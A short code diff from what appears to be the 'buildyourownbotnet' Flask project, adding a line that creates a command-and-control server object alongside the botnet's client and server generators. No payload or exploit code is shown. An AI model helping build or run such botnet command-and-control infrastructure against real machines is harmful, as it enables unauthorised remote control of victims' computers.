@@ -33,6 +33,8 @@ db.create_all()
 # import server and client generator
 from buildyourownbotnet import client, server
 
+c2 = server.C2()
+
 # import blueprints
 from buildyourownbotnet.main.routes import main
 from buildyourownbotnet.users.routes import users
